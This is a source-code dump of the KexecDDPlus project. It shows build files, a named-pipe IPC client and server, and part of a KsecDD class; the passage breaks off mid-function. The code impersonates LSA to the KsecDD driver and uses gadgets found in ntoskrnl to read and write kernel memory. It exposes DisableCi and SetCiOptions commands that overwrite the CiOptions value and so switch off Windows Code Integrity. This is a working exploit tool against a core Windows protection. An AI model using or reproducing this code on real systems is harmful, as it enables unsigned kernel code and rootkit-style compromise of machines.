Project Path: arc_gmh5225_KexecDDPlus_4j65xwjy

Source Tree:

```txt
arc_gmh5225_KexecDDPlus_4j65xwjy
├── Common
│   ├── Common.vcxproj
│   ├── Common.vcxproj.filters
│   ├── IpcClient.cpp
│   ├── IpcClient.h
│   ├── IpcServer.cpp
│   ├── IpcServer.h
│   ├── KsecDD.cpp
│   ├── KsecDD.h
│   ├── ServerSilo.cpp
│   ├── ServerSilo.h
│   ├── common.cpp
│   ├── common.h
│   ├── ipc.h
│   └── nt.h
├── KexecDDPlus
│   ├── KexecDDPlus.cpp
│   ├── KexecDDPlus.vcxproj
│   └── KexecDDPlus.vcxproj.filters
├── KexecDDPlus.sln
└── README.md

```

`Common/Common.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{778eb295-bf7a-4ecb-889f-ba23a8fc409a}</ProjectGuid>
    <RootNamespace>Common</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>StaticLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <TreatWarningAsError>true</TreatWarningAsError>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
    <Lib>
      <TreatLibWarningAsErrors>true</TreatLibWarningAsErrors>
    </Lib>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <TreatWarningAsError>true</TreatWarningAsError>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
    <Lib>
      <TreatLibWarningAsErrors>true</TreatLibWarningAsErrors>
    </Lib>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="common.h" />
    <ClInclude Include="ipc.h" />
    <ClInclude Include="IpcClient.h" />
    <ClInclude Include="IpcServer.h" />
    <ClInclude Include="nt.h" />
    <ClInclude Include="ServerSilo.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="common.cpp" />
    <ClCompile Include="IpcClient.cpp" />
    <ClCompile Include="IpcServer.cpp" />
    <ClCompile Include="ServerSilo.cpp" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Common/Common.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="nt.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ServerSilo.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="IpcServer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ipc.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="IpcClient.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="common.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ServerSilo.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="IpcServer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="IpcClient.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`Common/IpcClient.cpp`:

```cpp
#include "IpcClient.h"
#include "common.h"
#include "ipc.h"

IpcClient::IpcClient()
{
    m_hPipeHandle = INVALID_HANDLE_VALUE;
    m_pbIoBuffer = NULL;

    if (!(m_pbIoBuffer = (LPBYTE)Common::Alloc(PAGE_SIZE))) goto exit;

exit:
    return;
}

IpcClient::~IpcClient()
{
    if (m_pbIoBuffer) Common::Free(m_pbIoBuffer);
    if (m_hPipeHandle && m_hPipeHandle != INVALID_HANDLE_VALUE) CloseHandle(m_hPipeHandle);
}

BOOL IpcClient::Connect()
{
    return this->ConnectToNamedPipe(&this->m_hPipeHandle);
}

BOOL IpcClient::Disconnect()
{
    if (!CloseHandle(this->m_hPipeHandle))
    {
        PRINT_ERROR_WIN32(L"CloseHandle");
        return FALSE;
    }

    this->m_hPipeHandle = INVALID_HANDLE_VALUE;

    return TRUE;
}

BOOL IpcClient::IsConnected()
{
    return this->m_hPipeHandle && this->m_hPipeHandle != INVALID_HANDLE_VALUE;
}

BOOL IpcClient::SendPingRequest()
{
    BOOL bResult = FALSE;
    PIPC_REQUEST_PING req = (PIPC_REQUEST_PING)this->m_pbIoBuffer;
    PIPC_RESPONSE_PING resp = (PIPC_RESPONSE_PING)this->m_pbIoBuffer;
    DWORD dwResponseSize;

    req->Header.Type = static_cast<DWORD>(MessageType::Ping);
    swprintf_s(req->Message, L"%s", L"PING");

    if (!this->SendAndReceive(this->m_pbIoBuffer, sizeof(*req), &dwResponseSize)) goto exit;

    if (!resp->Header.Result || _wcsicmp(resp->Message, L"PONG") != 0)
    {
        PRINT_ERROR(L"Ping request failed.\n");
        goto exit;
    }

    bResult = TRUE;

exit:
    return bResult;
}

BOOL IpcClient::SendStopServerRequest()
{
    BOOL bResult = FALSE;
    PIPC_REQUEST_STOP_SERVER req = (PIPC_REQUEST_STOP_SERVER)this->m_pbIoBuffer;
    PIPC_RESPONSE_STOP_SERVER resp = (PIPC_RESPONSE_STOP_SERVER)this->m_pbIoBuffer;
    DWORD dwResponseSize;

    req->Header.Type = static_cast<DWORD>(MessageType::StopServer);

    if (!this->SendAndReceive(this->m_pbIoBuffer, sizeof(*req), &dwResponseSize)) goto exit;

    if (dwResponseSize != sizeof(*resp))
    {
        PRINT_WARNING(L"Response message size mismatch (%d, should be %d).\n", dwResponseSize, (DWORD)sizeof(*resp));
    }

    if (!resp->Header.Result)
    {
        PRINT_ERROR(L"Stop Server request failed.\n");
        goto exit;
    }

    bResult = TRUE;

exit:
    return bResult;
}

BOOL IpcClient::SendQueryCiOptionsRequest(OUT PDWORD CiOptions)
{
    BOOL bResult = FALSE;
    PIPC_REQUEST_QUERY_CI_OPTIONS req = (PIPC_REQUEST_QUERY_CI_OPTIONS)this->m_pbIoBuffer;
    PIPC_RESPONSE_QUERY_CI_OPTIONS resp = (PIPC_RESPONSE_QUERY_CI_OPTIONS)this->m_pbIoBuffer;
    DWORD dwResponseSize;

    req->Header.Type = static_cast<DWORD>(MessageType::QueryCiOptions);

    if (!this->SendAndReceive(this->m_pbIoBuffer, sizeof(*req), &dwResponseSize)) goto exit;

    if (dwResponseSize != sizeof(*resp))
    {
        PRINT_WARNING(L"Response message size mismatch (%d, should be %d).\n", dwResponseSize, (DWORD)sizeof(*resp));
    }

    if (!resp->Header.Result)
    {
        PRINT_ERROR(L"Query Ci Options request failed.\n");
        goto exit;
    }

    *CiOptions = resp->CiOptions;
    bResult = TRUE;

exit:
    return bResult;
}

BOOL IpcClient::SendDisableCiRequest()
{
    BOOL bResult = FALSE;
    PIPC_REQUEST_DISABLE_CI req = (PIPC_REQUEST_DISABLE_CI)this->m_pbIoBuffer;
    PIPC_RESPONSE_DISABLE_CI resp = (PIPC_RESPONSE_DISABLE_CI)this->m_pbIoBuffer;
    DWORD dwResponseSize;

    req->Header.Type = static_cast<DWORD>(MessageType::DisableCi);

    if (!this->SendAndReceive(this->m_pbIoBuffer, sizeof(*req), &dwResponseSize)) goto exit;

    if (dwResponseSize != sizeof(*resp))
    {
        PRINT_WARNING(L"Response message size mismatch (%d, should be %d).\n", dwResponseSize, (DWORD)sizeof(*resp));
    }

    if (!resp->Header.Result)
    {
        PRINT_ERROR(L"Disable CI request failed.\n");
        goto exit;
    }

    bResult = TRUE;

exit:
    return bResult;
}

BOOL IpcClient::SendSetCiOptionsRequest(IN DWORD CiOptions)
{
    BOOL bResult = FALSE;
    PIPC_REQUEST_SET_CI_OPTIONS req = (PIPC_REQUEST_SET_CI_OPTIONS)this->m_pbIoBuffer;
    PIPC_RESPONSE_SET_CI_OPTIONS resp = (PIPC_RESPONSE_SET_CI_OPTIONS)this->m_pbIoBuffer;
    DWORD dwResponseSize;

    req->Header.Type = static_cast<DWORD>(MessageType::SetCiOptions);
    req->CiOptions = CiOptions;

    if (!this->SendAndReceive(m_pbIoBuffer, sizeof(*req), &dwResponseSize)) goto exit;

    if (dwResponseSize != sizeof(*resp))
    {
        PRINT_WARNING(L"Response message size mismatch (%d, should be %d).\n", dwResponseSize, (DWORD)sizeof(*resp));
    }

    if (!resp->Header.Result)
    {
        PRINT_ERROR(L"Set CI options request failed.\n");
        goto exit;
    }

    bResult = TRUE;

exit:
    return bResult;
}

BOOL IpcClient::ConnectToNamedPipe(OUT PHANDLE PipeHandle)
{
    BOOL bResult = FALSE;
    LPWSTR pwszPipeName = NULL;
    HANDLE hPipe = NULL;

    *PipeHandle = INVALID_HANDLE_VALUE;

    if (!(pwszPipeName = (LPWSTR)Common::Alloc(MAX_PATH * sizeof(WCHAR)))) goto exit;

    swprintf_s(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\%ws", IPC_NAMED_PIPE_NAME);

    hPipe = CreateFileW(pwszPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (!hPipe || hPipe == INVALID_HANDLE_VALUE)
    {
        PRINT_ERROR_WIN32(L"CreateFileW");
        goto exit;
    }

    *PipeHandle = hPipe;
    bResult = TRUE;

exit:
    if (pwszPipeName) Common::Free(pwszPipeName);

    return bResult;
}

BOOL IpcClient::SendAndReceive(IN OUT LPBYTE IoBuffer, IN DWORD RequestSize, OUT PDWORD ResponseSize)
{
    BOOL bResult = FALSE;
    DWORD dwBytesWritten, dwBytesRead;

    if (!WriteFile(this->m_hPipeHandle, IoBuffer, RequestSize, &dwBytesWritten, NULL))
    {
        PRINT_ERROR_WIN32(L"WriteFile");
        goto exit;
    }

    if (!ReadFile(this->m_hPipeHandle, IoBuffer, PAGE_SIZE, &dwBytesRead, NULL))
    {
        PRINT_ERROR_WIN32(L"ReadFile");
        goto exit;
    }

    *ResponseSize = dwBytesRead;
    bResult = TRUE;

exit:
    return bResult;
}
```

`Common/IpcClient.h`:

```h
#pragma once

#include <Windows.h>

class IpcClient
{
public:
    IpcClient();
    ~IpcClient();

    BOOL Connect();
    BOOL Disconnect();
    BOOL IsConnected();
    BOOL SendPingRequest();
    BOOL SendStopServerRequest();
    BOOL SendQueryCiOptionsRequest(OUT PDWORD CiOptions);
    BOOL SendDisableCiRequest();
    BOOL SendSetCiOptionsRequest(IN DWORD CiOptions);

private:
    HANDLE m_hPipeHandle;
    LPBYTE m_pbIoBuffer;

    BOOL ConnectToNamedPipe(OUT PHANDLE PipeHandle);
    BOOL SendAndReceive(IN OUT LPBYTE IoBuffer, IN DWORD RequestSize, OUT PDWORD ResponseSize);
};
```

`Common/IpcServer.cpp`:

```cpp
#include "IpcServer.h"
#include "ipc.h"
#include "common.h"
#include <sddl.h>

IpcServer::IpcServer()
{
    m_hPipeHandle = INVALID_HANDLE_VALUE;
    m_pbIoBuffer = NULL;
    m_bIsInitialized = FALSE;
    m_bStopServer = FALSE;
    m_ksecClient = nullptr;

    if (!this->CreateCustomNamedPipe(&m_hPipeHandle, FALSE)) goto exit;
    if (!(m_pbIoBuffer = (LPBYTE)Common::Alloc(PAGE_SIZE))) goto exit;

    m_bIsInitialized = TRUE;

exit:
    return;
}

IpcServer::~IpcServer()
{
    if (m_pbIoBuffer) Common::Free(m_pbIoBuffer);
    if (m_hPipeHandle && m_hPipeHandle != INVALID_HANDLE_VALUE) CloseHandle(m_hPipeHandle);
}

BOOL IpcServer::Listen()
{
    BOOL bResult = FALSE, bClientConnected = FALSE;
    DWORD dwBytesRead, dwBytesWritten, dwResponseSize = 0;

    bClientConnected = ConnectNamedPipe(this->m_hPipeHandle, NULL);
    if (!bClientConnected && GetLastError() != ERROR_PIPE_CONNECTED)
    {
        PRINT_ERROR_WIN32(L"ConnectNamedPipe");
        goto exit;
    }

    while (!m_bStopServer)
    {
        ZeroMemory(this->m_pbIoBuffer, PAGE_SIZE);

        if (!ReadFile(this->m_hPipeHandle, this->m_pbIoBuffer, PAGE_SIZE, &dwBytesRead, NULL) || dwBytesRead == 0)
        {
            PRINT_ERROR_WIN32(L"ReadFile");
            break;
        }

        if (!this->ProcessRequest(m_pbIoBuffer, &dwResponseSize))
        {
            PRINT_ERROR(L"Fail to process request.\n");
            break;
        }

        if (!WriteFile(this->m_hPipeHandle, this->m_pbIoBuffer, dwResponseSize, &dwBytesWritten, NULL) || dwBytesWritten != dwResponseSize)
        {
            PRINT_ERROR_WIN32(L"WriteFile");
            break;
        }

        if (!FlushFileBuffers(this->m_hPipeHandle))
        {
            PRINT_ERROR_WIN32(L"FlushFileBuffers");
            break;
        }

        bResult = TRUE;
    }

exit:
    if (bClientConnected && this->m_hPipeHandle != INVALID_HANDLE_VALUE) DisconnectNamedPipe(this->m_hPipeHandle);

    return bResult;
}

BOOL IpcServer::ListenInThread(OUT PHANDLE ThreadHandle)
{
    BOOL bResult = FALSE;
    HANDLE hThread = NULL;

    if (!(hThread = CreateThread(NULL, 0, ListenThread, this, 0, NULL)))
    {
        PRINT_ERROR_WIN32(L"CreateThread");
        goto exit;
    }

    *ThreadHandle = hThread;
    bResult = TRUE;

exit:
    return bResult;
}

BOOL IpcServer::Stop()
{
    this->m_bStopServer = TRUE;

    return TRUE;
}

BOOL IpcServer::IsInitialized() const
{
    return m_bIsInitialized;
}

BOOL IpcServer::SetKsecClient(IN KsecDD* Ksec)
{
    if (this->m_ksecClient)
    {
        PRINT_ERROR(L"A KsecDD client is already set.\n");
        return FALSE;
    }
    else
    {
        this->m_ksecClient = Ksec;
        return TRUE;
    }
}

BOOL IpcServer::CreateCustomNamedPipe(OUT PHANDLE PipeHandle, IN BOOL Async)
{
    BOOL bResult = FALSE;
    LPWSTR pwszPipeName = NULL;
    HANDLE hPipe = INVALID_HANDLE_VALUE;
    DWORD dwOpenMode, dwPipeMode, dwMaxInstances;

    if (!(pwszPipeName = (LPWSTR)Common::Alloc(MAX_PATH * sizeof(WCHAR)))) goto exit;

    swprintf_s(pwszPipeName, MAX_PATH, L"\\\\.\\pipe\\%ws", IPC_NAMED_PIPE_NAME);

    dwOpenMode = PIPE_ACCESS_DUPLEX | (Async ? FILE_FLAG_OVERLAPPED : 0);
    dwPipeMode = PIPE_TYPE_BYTE | PIPE_WAIT;
    dwMaxInstances = PIPE_UNLIMITED_INSTANCES;

    hPipe = CreateNamedPipeW(pwszPipeName, dwOpenMode, dwPipeMode, dwMaxInstances, PAGE_SIZE, PAGE_SIZE, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        PRINT_ERROR_WIN32(L"CreateNamedPipeW");
        goto exit;
    }

    *PipeHandle = hPipe;
    bResult = TRUE;

exit:
    if (pwszPipeName) Common::Free(pwszPipeName);

    return bResult;
}

BOOL IpcServer::ProcessRequest(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize)
{
    BOOL bResult = FALSE;
    DWORD dwType = 0;
    MessageType type;

    dwType = ((PIPC_REQUEST_HEADER)IoBuffer)->Type;
    if (dwType == 0 || dwType >= static_cast<DWORD>(MessageType::MaxValue))
    {
        PRINT_ERROR(L"Message type value out of range: %d\n", dwType);
        goto exit;
    }

    type = static_cast<MessageType>(dwType);
    switch (type)
    {
    case MessageType::Ping:
        bResult = this->DoPing(IoBuffer, ResponseSize);
        break;
    case MessageType::StopServer:
        bResult = this->DoStopServer(IoBuffer, ResponseSize);
        break;
    case MessageType::QueryCiOptions:
        bResult = this->DoQueryCiOptions(IoBuffer, ResponseSize);
        break;
    case MessageType::DisableCi:
        bResult = this->DoDisableCi(IoBuffer, ResponseSize);
        break;
    case MessageType::SetCiOptions:
        bResult = this->DoSetCiOptions(IoBuffer, ResponseSize);
        break;
    case MessageType::MaxValue:
        break;
    default:
        break;
    }

exit:
    return bResult;
}

BOOL IpcServer::DoPing(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize)
{
    PIPC_REQUEST_PING req = (PIPC_REQUEST_PING)IoBuffer;
    PIPC_RESPONSE_PING resp = (PIPC_RESPONSE_PING)IoBuffer;

    if (_wcsicmp(req->Message, L"PING") == 0)
    {
        resp->Header.Type = static_cast<DWORD>(MessageType::Ping);
        resp->Header.Result = TRUE;
        resp->Header.Status = 0;

        swprintf_s(resp->Message, sizeof(resp->Message) / sizeof(*resp->Message), L"%ws", L"PONG");
    }
    else
    {
        resp->Header.Type = static_cast<DWORD>(MessageType::Ping);
        resp->Header.Result = FALSE;
        resp->Header.Status = 0;
    }

    *ResponseSize = sizeof(*resp);

    return TRUE;
}

BOOL IpcServer::DoStopServer(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize)
{
    PIPC_REQUEST_STOP_SERVER req = (PIPC_REQUEST_STOP_SERVER)IoBuffer;
    PIPC_RESPONSE_STOP_SERVER resp = (PIPC_RESPONSE_STOP_SERVER)IoBuffer;

    resp->Header.Type = static_cast<DWORD>(MessageType::StopServer);
    resp->Header.Result = TRUE;
    resp->Header.Status = 0;

    *ResponseSize = sizeof(*resp);

    this->m_bStopServer = TRUE;

    return TRUE;
}

BOOL IpcServer::DoQueryCiOptions(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize)
{
    PIPC_REQUEST_QUERY_CI_OPTIONS req = (PIPC_REQUEST_QUERY_CI_OPTIONS)IoBuffer;
    PIPC_RESPONSE_QUERY_CI_OPTIONS resp = (PIPC_RESPONSE_QUERY_CI_OPTIONS)IoBuffer;
    DWORD dwCiOptions;
    BOOL bSuccess;

    if (!this->m_ksecClient)
    {
        PRINT_ERROR(L"KsecDD not yet initialized.\n");
        return FALSE;
    }

    bSuccess = this->m_ksecClient->QueryCiOptionsValue(&dwCiOptions);

    resp->Header.Type = static_cast<DWORD>(MessageType::QueryCiOptions);
    resp->Header.Result = bSuccess;
    resp->Header.Status = 0;
    resp->CiOptions = dwCiOptions;

    *ResponseSize = sizeof(*resp);

    return TRUE;
}

BOOL IpcServer::DoDisableCi(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize)
{
    PIPC_REQUEST_DISABLE_CI req = (PIPC_REQUEST_DISABLE_CI)IoBuffer;
    PIPC_RESPONSE_DISABLE_CI resp = (PIPC_RESPONSE_DISABLE_CI)IoBuffer;
    BOOL bSuccess;

    if (!this->m_ksecClient)
    {
        PRINT_ERROR(L"KsecDD not yet initialized.\n");
        return FALSE;
    }

    bSuccess = this->m_ksecClient->SetCiOptionsValue(0);

    resp->Header.Type = static_cast<DWORD>(MessageType::DisableCi);
    resp->Header.Result = bSuccess;
    resp->Header.Status = 0;

    *ResponseSize = sizeof(*resp);

    return TRUE;
}

BOOL IpcServer::DoSetCiOptions(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize)
{
    PIPC_REQUEST_SET_CI_OPTIONS req = (PIPC_REQUEST_SET_CI_OPTIONS)this->m_pbIoBuffer;
    PIPC_RESPONSE_SET_CI_OPTIONS resp = (PIPC_RESPONSE_SET_CI_OPTIONS)this->m_pbIoBuffer;
    BOOL bSuccess;

    if (!this->m_ksecClient)
    {
        PRINT_ERROR(L"KsecDD not yet initialized.\n");
        return FALSE;
    }

    bSuccess = this->m_ksecClient->SetCiOptionsValue(req->CiOptions);

    resp->Header.Type = static_cast<DWORD>(MessageType::SetCiOptions);
    resp->Header.Result = bSuccess;
    resp->Header.Status = 0;

    *ResponseSize = sizeof(*resp);

    return TRUE;
}

DWORD __stdcall IpcServer::ListenThread(IN LPVOID lpParameter)
{
    IpcServer* server = reinterpret_cast<IpcServer*>(lpParameter);
    
    server->Listen();

    return 0;
}
```

`Common/IpcServer.h`:

```h
#pragma once

#include "KsecDD.h"
#include <Windows.h>

class IpcServer
{
public:
    IpcServer();
    ~IpcServer();

    BOOL Listen();
    BOOL ListenInThread(OUT PHANDLE ThreadHandle);
    BOOL Stop();
    BOOL IsInitialized() const;
    BOOL SetKsecClient(IN KsecDD* Ksec);

private:
    HANDLE m_hPipeHandle;
    LPBYTE m_pbIoBuffer;
    BOOL m_bIsInitialized;
    BOOL m_bStopServer;
    KsecDD* m_ksecClient;

    BOOL CreateCustomNamedPipe(OUT PHANDLE PipeHandle, IN BOOL Async);
    BOOL ProcessRequest(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize);
    BOOL DoPing(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize);
    BOOL DoStopServer(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize);
    BOOL DoQueryCiOptions(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize);
    BOOL DoDisableCi(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize);
    BOOL DoSetCiOptions(IN OUT LPBYTE IoBuffer, OUT PDWORD ResponseSize);

    static DWORD WINAPI ListenThread(IN LPVOID lpParameter);
};
```

`Common/KsecDD.cpp`:

```cpp
#include "KsecDD.h"
#include "nt.h"
#include "common.h"

KsecDD::KsecDD()
{
    BYTE readGadgetPattern[] = PATTERN_READ_MEMORY;
    BYTE writeGadgetPattern[] = PATTERN_WRITE_MEMORY;

    m_hDevice = NULL;
    m_bIsInitialized = FALSE;
    m_pKernelBaseAddress = 0;
    m_pCiBaseAddress = 0;
    m_dwCiOptionsOffset = 0;
    m_dwReadGadgetOffset = 0;
    m_dwWriteGadgetOffset = 0;
    m_pReadGadgetAddress = 0;
    m_pWriteGadgetAddress = 0;

    if (!Common::FindKernelModuleBaseAddress("ntoskrnl.exe", &m_pKernelBaseAddress)) goto exit;
    if (!Common::FindKernelModuleBaseAddress("ci.dll", &m_pCiBaseAddress)) goto exit;
    if (!Common::FindCiOptionsOffset(&m_dwCiOptionsOffset)) goto exit;
    if (!Common::FindGadgetOffset(L"ntoskrnl.exe", readGadgetPattern, sizeof(readGadgetPattern), &m_dwReadGadgetOffset)) goto exit;
    if (!Common::FindGadgetOffset(L"ntoskrnl.exe", writeGadgetPattern, sizeof(writeGadgetPattern), &m_dwWriteGadgetOffset)) goto exit;

    m_pReadGadgetAddress = m_pKernelBaseAddress + m_dwReadGadgetOffset;
    m_pWriteGadgetAddress = m_pKernelBaseAddress + m_dwWriteGadgetOffset;
    m_bIsInitialized = TRUE;

exit:
    return;
}

KsecDD::~KsecDD()
{
    if (m_hDevice) NtClose(m_hDevice);
}

BOOL KsecDD::IsInitialized() const
{
    return m_bIsInitialized;
}

BOOL KsecDD::IsConnected()
{
    return this->m_hDevice != NULL;
}

BOOL KsecDD::Connect()
{
    BOOL bResult = FALSE;

    if (!this->SetLsaInitializedEvent(KSEC_EVENT_NAME_U)) goto exit;
    if (!this->OpenDevice(DD_KSEC_DEVICE_NAME_U, &this->m_hDevice)) goto exit;
    if (!this->IoctlConnectLsa(NULL)) goto exit;

    bResult = TRUE;

exit:
    return bResult;
}

BOOL KsecDD::Disconnect()
{
    NTSTATUS status;

    if (!this->m_hDevice)
        return TRUE;

    status = NtClose(this->m_hDevice);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtClose", status);
        return FALSE;
    }

    this->m_hDevice = NULL;

    return TRUE;
}

BOOL KsecDD::QueryCiOptionsValue(OUT PDWORD CiOptions)
{
    return this->ReadKernelMemory32(this->m_pCiBaseAddress + this->m_dwCiOptionsOffset, (PUINT32)CiOptions);
}

BOOL KsecDD::SetCiOptionsValue(IN DWORD CiOptions)
{
    return this->WriteKernelMemory32(this->m_pCiBaseAddress + this->m_dwCiOptionsOffset, CiOptions);
}

BOOL KsecDD::CheckIsInitialized()
{
    if (!m_bIsInitialized)
    {
        PRINT_ERROR(L"Client is not initialized.\n");
        return FALSE;
    }

    return TRUE;
}

BOOL KsecDD::SetLsaInitializedEvent(IN LPCWSTR Event)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    HANDLE hEvent = NULL;
    UNICODE_STRING usEventPath = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };

    RtlInitUnicodeString(&usEventPath, Event);
    InitializeObjectAttributes(&oa, &usEventPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenEvent(&hEvent, EVENT_MODIFY_STATE, &oa);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtOpenEvent", status);
        goto exit;
    }

    status = NtSetEvent(hEvent, NULL);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetEvent", status);
        goto exit;
    }

    bResult = TRUE;

exit:
    if (hEvent) NtClose(hEvent);

    return bResult;
}

BOOL KsecDD::OpenDevice(IN LPCWSTR Name, OUT PHANDLE Device)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    UNICODE_STRING usDevicePath = { 0 };
    OBJECT_ATTRIBUTES oa = { 0 };
    IO_STATUS_BLOCK iosb = { 0 };
    HANDLE hDevice = NULL;
    FILE_IO_COMPLETION_NOTIFICATION_INFORMATION FileInformation = { 0 };

    *Device = NULL;

    RtlInitUnicodeString(&usDevicePath, Name);
    InitializeObjectAttributes(&oa, &usDevicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hDevice, GENERIC_READ | GENERIC_WRITE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtOpenFile", status);
        goto exit;
    }

    // As implemented in lsass!LsapOpenKsec
    FileInformation.Flags = FILE_SKIP_SET_EVENT_ON_HANDLE | FILE_SKIP_SET_USER_EVENT_ON_FAST_IO;

    status = NtSetInformationFile(hDevice, &iosb, &FileInformation, sizeof(FileInformation), (FILE_INFORMATION_CLASS)FileIoCompletionNotificationInformation);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtSetInformationFile", status);
        goto exit;
    }

    *Device = hDevice;
